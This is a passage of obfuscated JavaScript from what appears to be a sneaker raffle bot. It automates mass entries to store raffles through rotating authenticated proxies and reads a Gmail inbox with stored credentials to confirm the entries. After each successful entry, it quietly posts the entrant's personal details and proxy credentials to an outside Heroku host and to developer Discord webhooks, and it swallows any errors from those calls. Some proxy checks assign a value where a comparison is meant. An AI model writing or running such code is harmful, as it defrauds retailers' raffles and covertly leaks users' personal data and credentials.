                            await _0x468cfd(0x12c), console['log'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x295cca['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x468cfd(0x12c), await _0x295cca['type']('#dwfrm_raffle_addressFields_firstName', _0x4a80c0[_0x32ab99]['FirstName']), await _0x468cfd(0x12c), await _0x295cca['type']('#dwfrm_raffle_addressFields_lastName', _0x4a80c0[_0x32ab99]['LastName']), await _0x468cfd(0x12c), await _0x295cca['select']('#dwfrm_raffle_addressFields_country', _0x4a80c0[_0x32ab99]['Country']), await _0x468cfd(0x12c), await _0x295cca['type']('#dwfrm_raffle_addressFields_city', _0x4a80c0[_0x32ab99]['City']), await _0x468cfd(0x12c);
                            _0x4a80c0[_0x32ab99]['Postcode'] == undefined && (_0x4a80c0[_0x32ab99]['Postcode'] = _0x4a80c0[_0x32ab99]['Zip']);
                            await _0x295cca['type']('#dwfrm_raffle_addressFields_postalCode', _0x4a80c0[_0x32ab99]['Postcode']), await _0x468cfd(0x12c), await _0x295cca['type']('#dwfrm_raffle_addressFields_address1', _0x4a80c0[_0x32ab99]['Address1']), await _0x468cfd(0x12c), await _0x295cca['type']('#dwfrm_raffle_addressFields_address2', _0x4a80c0[_0x32ab99]['HouseNumber']), await _0x468cfd(0x12c), await _0x295cca['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x4a80c0[_0x32ab99]['Address2']), await _0x468cfd(0x12c), await _0x295cca['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x468cfd(0x12c), await _0x295cca['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x4a80c0[_0x32ab99]['Follower']), await _0x468cfd(0x1f4), await _0x295cca['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x468cfd(0x1f4), console['log'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20' + _0x54c1f9['blue']('Awaiting\x20Paypal\x20Payment')), await _0x295cca['click']('.b-paypal_button');
                            try {
                                await _0x295cca['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x49aa58 = 'no', _0x504d25(_0x4a80c0[_0x32ab99], _0x417d80), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x357c3d['succesDEVMSG']);
                                await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x357c3d['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x578906, _0x357c3d['succesPUBMSG']);
                                let _0x1f7454 = _0x4a80c0[_0x32ab99];
                                try {
                                    prxdata = {
                                        'username': _0x50fbd1['replace']('#', ''),
                                        'module': _0x417d80['name'],
                                        'entrydata': JSON['stringify'](_0x1f7454),
                                        'proxy': '' + _0x3451b6[_0x32ab99]
                                    };
                                    var _0x25b45c = JSON['stringify'](prxdata);
                                    let _0x1f36e6 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x25b45c, _0x1f36e6);
                                } catch (_0x3065bf) {
                                }
                            } catch (_0xb17fb1) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0xb17fb1)), _0x4e039a = 'Error\x20while\x20entering\x20Paypal:\x20' + _0xb17fb1;
                                var _0x181471 = await _0x436de5(_0x4a80c0[_0x32ab99], _0x417d80, 'dev', !![], _0x4e039a);
                                _0x357c3d['errorDEV'] = { 'embeds': [_0x181471] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x357c3d['errorDEV']), await _0x4feadc(_0x408671, _0x357c3d['errorDEV']);
                            }
                        } catch (_0x511f4b) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20' + _0x511f4b)), _0x4e039a = '' + _0x511f4b;
                            var _0x181471 = await _0x436de5(_0x4a80c0[_0x32ab99], _0x417d80, 'dev', !![], _0x4e039a);
                            _0x357c3d['errorDEV'] = { 'embeds': [_0x181471] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x357c3d['errorDEV']), await _0x4feadc(_0x408671, _0x357c3d['errorDEV']), _0x49aa58 = 'yes';
                        } finally {
                            _0x4413d9 && _0x4413d9['close']();
                            if (_0x49aa58 == 'yes' && _0x15c883 != 0x5) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20Retrying\x20(' + _0x15c883 + '\x20/\x205)')), _0x32ab99 = _0x32ab99 - 0x1, _0x15c883 = _0x15c883 + 0x1;
                                continue;
                            }
                            _0x49aa58 == 'yes' && _0x15c883 >= 0x5 && (_0x5cd42d(_0x4a80c0[_0x32ab99], _0x417d80), _0x49aa58 = 'no', _0x15c883 = 0x0), console['log']('Waiting\x20for\x20' + _0x2c28ef['AfewDelay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x79bd55, _0xd07446, _0x2879e7) {
                    for (var _0x277023 = 0x0; _0x277023 < _0xd07446['length']; _0x277023++) {
                        try {
                            await _0x16822f(_0xd07446, _0x277023);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x4b609e(_0x2e880a, _0x30e5d2, _0x728736, _0x3e55f8, _0x404a31) {
                            var _0x326048, _0x48a754 = {}, _0x17b064 = [], _0x1d30b2 = {}, _0x33053e = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0xbda542 = Math['round'](Math['random']() * (_0x33053e['length'] - 0x1));
                            !_0x3e55f8 && (_0x3e55f8 = {});
                            if (_0x30e5d2 != 'ver') {
                                _0x48898b(_0x728736['name'] + '\x20Task\x20' + (_0x2e880a + 0x1) + '\x20/\x20' + _0x3e55f8['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851), await _0x16822f(_0x3e55f8, _0x2e880a), _0x48a754 = _0x728736['data'], _0x48a754['data']['attributes']['email'] = '' + _0x3e55f8[_0x2e880a]['Email'];
                                if (_0x3e55f8[_0x2e880a]['Size'] == 'RANDOM') {
                                }
                                _0x48a754['data']['attributes']['properties']['$first_name'] = '' + _0x3e55f8[_0x2e880a]['FirstName'], _0x48a754['data']['attributes']['properties']['$last_name'] = '' + _0x3e55f8[_0x2e880a]['LastName'], _0x48a754['data']['attributes']['properties']['$address1'] = _0x3e55f8[_0x2e880a]['Address1'] + '\x20' + _0x3e55f8[_0x2e880a]['Address2'] + '\x20' + _0x3e55f8[_0x2e880a]['HouseNumber'], _0x48a754['data']['attributes']['properties']['$zip'] = '' + _0x3e55f8[_0x2e880a]['Zip'], _0x48a754['data']['attributes']['properties']['$city'] = '' + _0x3e55f8[_0x2e880a]['City'], _0x48a754['data']['attributes']['properties']['$country'] = '' + _0x3e55f8[_0x2e880a]['Country'], _0x3e55f8[_0x2e880a]['Size'] == 'RANDOM' ? _0x48a754['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x33053e[_0xbda542] : _0x48a754['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3e55f8[_0x2e880a]['Size'], _0x48a754['data']['attributes']['properties']['$phone_number'] = '' + _0x3e55f8[_0x2e880a]['Phone'], _0x48a754['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x3e55f8[_0x2e880a]['Follower'];
                            }
                            if (_0x2c28ef['useRandomProxy'] = ![])
                                var _0x1c2fdc = _0x404a31[_0x2e880a]['split'](':');
                            else
                                var _0x38d916 = Math['round'](Math['random']() * (_0x404a31['length'] - 0x1)), _0x1c2fdc = _0x404a31[_0x38d916]['split'](':');
                            var _0x23609a = {
                                'jar': _0x15a445,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x728736['url'],
                                'headers': _0x728736['headers'],
                                'body': JSON['stringify'](_0x48a754),
                                'proxy': 'http://' + _0x1c2fdc[0x2] + ':' + _0x1c2fdc[0x3] + '@' + _0x1c2fdc[0x0] + ':' + _0x1c2fdc[0x1]
                            };
                            return _0x30e5d2 != 'ver' && (_0x23609a['url'] = _0x728736['url'], _0x23609a['headers'] = _0x728736['headers']), _0x30e5d2 == 'ver' && (_0x23609a['method'] = 'GET'), new Promise(function (_0x2da60d, _0x39e413) {
                                callback = async (_0xbdd1ca, _0x5ae4f0, _0x43ff3d) => {
                                    if (!_0xbdd1ca && _0x5ae4f0['statusCode'] == 0xca || !_0xbdd1ca && _0x5ae4f0['statusCode'] == 0xc8) {
                                        if (_0x30e5d2 != 'ver') {
                                            var _0x590f06 = await _0x436de5(_0x3e55f8[_0x2e880a], _0x728736, 'dev', ![]), _0x4b9969 = await _0x436de5(_0x3e55f8[_0x2e880a], _0x728736, 'pub', ![]);
                                            const _0x331598 = {
                                                'succesDEVMSG': { 'embeds': [_0x590f06] },
                                                'succesPUBMSG': { 'embeds': [_0x4b9969] }
                                            };
                                            let _0x1b79ec = _0x3e55f8[_0x2e880a];
                                            try {
                                                prxdata = {
                                                    'username': _0x50fbd1['replace']('#', ''),
                                                    'module': _0x728736['name'],
                                                    'entrydata': JSON['stringify'](_0x1b79ec),
                                                    'proxy': '' + _0x404a31[_0x2e880a]
                                                };
                                                var _0xad91a5 = JSON['stringify'](prxdata);
                                                let _0x5a4e77 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0xad91a5, _0x5a4e77);
                                            } catch (_0x421663) {
                                            }
                                            if (_0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '')
                                                try {
                                                    await _0x4feadc(_0x2c28ef['webhook'], _0x331598['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x331598['succesDEVMSG']), await _0x468cfd(0xc8);
                                            try {
                                                await _0x4feadc(_0x578906, _0x331598['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x504d25(_0x3e55f8[_0x2e880a], _0x728736);
                                        }
                                        _0x2da60d(console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x728736['name'] + ']\x20Task\x20' + (_0x2e880a + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x30e5d2 != 'ver') {
                                            var _0x43f3be = '' + _0xbdd1ca, _0x2a5faa = await _0x436de5(_0x3e55f8[_0x2e880a], _0x728736, 'dev', !![], _0x43f3be), _0x2da0de = {};
                                            _0x2da0de['errorDEV'] = { 'embeds': [_0x2a5faa] }, _0x5cd42d(_0x3e55f8[_0x2e880a], _0x728736), _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x2da0de['errorDEV']), await _0x4feadc(_0x408671, _0x2da0de['errorDEV']);
                                        }
                                        _0x39e413(console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x728736['name'] + ']\x20Task\x20' + (_0x2e880a + 0x1) + ':\x20' + _0xbdd1ca)));
                                    }
                                };
                                try {
                                    _0x30e5d2 != 'ver' && console['log'](_0x2e90f3() + '\x20[' + _0x728736['name'] + ']\x20Task\x20' + (_0x2e880a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x48a754['data']['attributes']['email']), _0x59e135(_0x23609a, callback);
                                } catch (_0x4cfaf6) {
                                    console['log'](_0x2e90f3() + '\x20Task\x20' + (_0x2e880a + 0x1) + ':\x20' + _0x4cfaf6);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x4b609e(_0x277023, 'nor', _0x79bd55, _0xd07446, _0x2879e7), console['log'](_0x2e90f3() + '\x20[' + _0x79bd55['name'] + ']\x20Sleeping\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        } catch (_0xa7132b) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x139b8f, _0x456748, _0x165d25) {
                    var _0x2f853e = [], _0x4807cf = ![];
                    async function _0x53b25b() {
                        var _0x573ce5 = new _0x3b7ac6({
                            'user': _0x2c28ef['masterMail'],
                            'password': _0x2c28ef['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x371d68(_0x2c6db1) {
                            _0x573ce5['openBox']('INBOX', ![], _0x2c6db1);
                        }
                        _0x573ce5['once']('ready', function () {
                            _0x371d68(function (_0x276398, _0x304cdb) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x276398)
                                    throw _0x276398;
                                _0x573ce5['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0xbd16d4, _0x158d42) {
                                    if (!_0x158d42 || !_0x158d42['length'])
                                        console['log'](_0x2e90f3() + '\x20[' + _0x139b8f['name'] + ']\x20No\x20mails\x20found'), _0x573ce5['end']();
                                    else {
                                        var _0x19d68f = _0x573ce5['seq']['fetch'](_0x158d42, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x19d68f['on']('message', function (_0x58047c, _0x1c1afc) {
                                            var _0x352a31 = '(#' + _0x1c1afc + ')\x20';
                                            _0x58047c['on']('body', function (_0x2fc00b, _0x15c772) {
                                                _0x4bee6e(_0x2fc00b, (_0x46b4bd, _0x501040) => {
                                                    var _0x2f7b58 = _0x501040['text']['split']('(')[0x1], _0x3220b1 = _0x2f7b58['split'](')')[0x0];
                                                    _0x2f853e['push'](_0x3220b1);
                                                });
                                            }), _0x58047c['once']('end', function () {
                                            });
                                        }), _0x19d68f['once']('error', function (_0x394ce5) {
                                            console['log']('Fetch\x20error:\x20' + _0x394ce5), _0x4807cf = !![];
                                        }), _0x19d68f['once']('end', function () {
                                            _0x573ce5['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x573ce5['once']('error', function (_0x5cf995) {
                            console['log'](_0x54c1f9['red'](_0x5cf995['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x4807cf = !![];
                        }), _0x573ce5['once']('end', async function () {
                            _0x4807cf = !![];
                        }), _0x573ce5['connect']();
                    }
                    async function _0x10e8d6(_0x5a337b, _0x1742e8, _0x2eb786) {
                        for (var _0xd6fe3e = 0x0; _0xd6fe3e < _0x1742e8['length']; _0xd6fe3e++) {
                            async function _0x454e89(_0x5dbce5, _0x4d3419, _0x610a6a, _0x1b92e9, _0x294802) {
                                var _0x3b30c1, _0x51899b = {}, _0x41fe33 = [], _0x547fa2 = {}, _0x32558c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x58a134 = Math['round'](Math['random']() * (_0x32558c['length'] - 0x1));
                                _0x1b92e9[_0x5dbce5]['Size'] == 'RANDOM' && (_0x1b92e9[_0x5dbce5]['Size'] = _0x32558c[_0x58a134]);
                                !_0x1b92e9 && (_0x1b92e9 = {});
                                if (_0x2c28ef['useRandomProxy'] = ![])
                                    var _0x425e44 = _0x294802[_0x5dbce5]['split'](':');
                                else
                                    var _0x360af0 = Math['round'](Math['random']() * (_0x294802['length'] - 0x1)), _0x425e44 = _0x294802[_0x360af0]['split'](':');
                                var _0x567c1f = {
                                    'jar': _0x15a445,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x610a6a['url'],
                                    'headers': _0x610a6a['headers'],
                                    'body': JSON['stringify'](_0x51899b),
                                    'proxy': 'http://' + _0x425e44[0x2] + ':' + _0x425e44[0x3] + '@' + _0x425e44[0x0] + ':' + _0x425e44[0x1]
                                };
                                return _0x4d3419 != 'ver' && (_0x567c1f['url'] = _0x610a6a['url'], _0x567c1f['headers'] = _0x610a6a['headers']), _0x4d3419 == 'ver' && (_0x567c1f['method'] = 'GET', _0x567c1f['url'] = _0x1b92e9[_0x5dbce5]), new Promise(function (_0x15de0d, _0x418e09) {
                                    callback = async (_0x2d37f, _0x7003b5, _0x1243d2) => {
                                        if (!_0x2d37f && _0x7003b5['statusCode'] == 0xca || !_0x2d37f && _0x7003b5['statusCode'] == 0xc8) {
                                            if (_0x4d3419 != 'ver') {
                                                var _0x43ca24 = await _0x436de5(_0x1b92e9[_0x5dbce5], _0x610a6a, 'dev', ![]), _0x578e1d = await _0x436de5(_0x1b92e9[_0x5dbce5], _0x610a6a, 'pub', ![]);
                                                const _0x140da4 = {
                                                    'succesDEVMSG': { 'embeds': [_0x43ca24] },
                                                    'succesPUBMSG': { 'embeds': [_0x578e1d] }
                                                };
                                                if (_0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '')
                                                    try {
                                                        await _0x4feadc(_0x2c28ef['webhook'], _0x140da4['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x140da4['succesDEVMSG']), await _0x468cfd(0xc8);
                                                try {
                                                    await _0x4feadc(_0x578906, _0x140da4['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x504d25(_0x1b92e9[_0x5dbce5], _0x610a6a);
                                            }
                                            _0x15de0d(console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x610a6a['name'] + ']\x20Task\x20' + (_0x5dbce5 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4d3419 != 'ver') {
                                                var _0x18582a = '' + _0x2d37f, _0xfbb4b2 = await _0x436de5(_0x1b92e9[_0x5dbce5], _0x610a6a, 'dev', !![], _0x18582a), _0x46c21c = {};
                                                _0x46c21c['errorDEV'] = { 'embeds': [_0xfbb4b2] }, _0x5cd42d(_0x1b92e9[_0x5dbce5], _0x610a6a), _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x46c21c['errorDEV']), await _0x4feadc(_0x408671, _0x46c21c['errorDEV']);
                                            }
                                            _0x418e09(console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x610a6a['name'] + ']\x20Task\x20' + (_0x5dbce5 + 0x1) + ':\x20' + _0x2d37f)));
                                        }
                                    };
                                    try {
                                        _0x4d3419 != 'ver' ? console['log'](_0x2e90f3() + '\x20[' + _0x610a6a['name'] + ']\x20Task\x20' + (_0x5dbce5 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x51899b['data']['attributes']['email']) : console['log'](_0x2e90f3() + '\x20[' + _0x610a6a['name'] + ']\x20Task\x20' + (_0x5dbce5 + 0x1) + ':\x20Fetching\x20Response'), _0x59e135(_0x567c1f, callback);
                                    } catch (_0x5306fc) {
                                        console['log'](_0x2e90f3() + '\x20Task\x20' + (_0x5dbce5 + 0x1) + ':\x20' + _0x5306fc);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x454e89(_0xd6fe3e, 'ver', _0x5a337b, _0x1742e8, _0x2eb786), console['log'](_0x2e90f3() + '\x20[' + _0x5a337b['name'] + ']\x20Sleeping\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                            } catch (_0x3e96d4) {
                            }
                        }
                    }
                    try {
                        _0x53b25b();
                        while (!_0x4807cf) {
                            await _0x468cfd(0xbb8);
                        }
                        console['log']('Found\x20' + _0x2f853e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x468cfd(0x9c4);
                    }
                    await _0x10e8d6(_0x139b8f, _0x2f853e, _0x165d25);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'X4md8Z',
                            'custom_source': 'DZ4137-106',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WspqGE',
                                '$consent_form_version': 0x89a2a4,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4791bc, _0x2761a5, _0x2bf3c7) {
                    for (var _0x799df = 0x0; _0x799df < _0x2761a5['length']; _0x799df++) {
                        try {
                            await _0x16822f(_0x2761a5, _0x799df);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x416c71(_0x4cd8e0, _0xd894e3, _0x1b6d85, _0x216906, _0xcd591e) {
                            var _0x4f1816, _0x16c989 = {}, _0x4f1d60 = [], _0x145e50 = {}, _0x5dc73b = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x39eb52 = Math['round'](Math['random']() * (_0x5dc73b['length'] - 0x1));
                            !_0x216906 && (_0x216906 = {});
                            if (_0xd894e3 != 'ver') {
                                _0x48898b(_0x1b6d85['name'] + '\x20Task\x20' + (_0x4cd8e0 + 0x1) + '\x20/\x20' + _0x216906['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851), _0x4f1d60 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x50fbd1
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x216906[_0x4cd8e0]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x2c28ef['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x9f51f3
                                        }
                                    ]
                                }], _0x145e50 = { 'embeds': _0x4f1d60 }, _0x16c989 = _0x1b6d85['data'], _0x16c989['data']['attributes']['email'] = '' + _0x216906[_0x4cd8e0]['Email'];
                                if (_0x216906[_0x4cd8e0]['Size'] == 'RANDOM') {
                                }
                                _0x16c989['data']['attributes']['properties']['$first_name'] = '' + _0x216906[_0x4cd8e0]['FirstName'], _0x16c989['data']['attributes']['properties']['$last_name'] = '' + _0x216906[_0x4cd8e0]['LastName'], _0x16c989['data']['attributes']['properties']['$address1'] = _0x216906[_0x4cd8e0]['Address1'] + '\x20' + _0x216906[_0x4cd8e0]['Address2'] + '\x20' + _0x216906[_0x4cd8e0]['HouseNumber'], _0x16c989['data']['attributes']['properties']['$zip'] = '' + _0x216906[_0x4cd8e0]['Zip'], _0x16c989['data']['attributes']['properties']['$city'] = '' + _0x216906[_0x4cd8e0]['City'], _0x16c989['data']['attributes']['properties']['$country'] = '' + _0x216906[_0x4cd8e0]['Country'], _0x216906[_0x4cd8e0]['Size'] == 'RANDOM' ? _0x16c989['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5dc73b[_0x39eb52] : _0x16c989['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x216906[_0x4cd8e0]['Size'], _0x16c989['data']['attributes']['properties']['$phone_number'] = '' + _0x216906[_0x4cd8e0]['Phone'], _0x16c989['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x216906[_0x4cd8e0]['Follower'];
                            }
                            if (_0x2c28ef['useRandomProxy'] = ![])
                                var _0x33b230 = _0xcd591e[_0x4cd8e0]['split'](':');
                            else
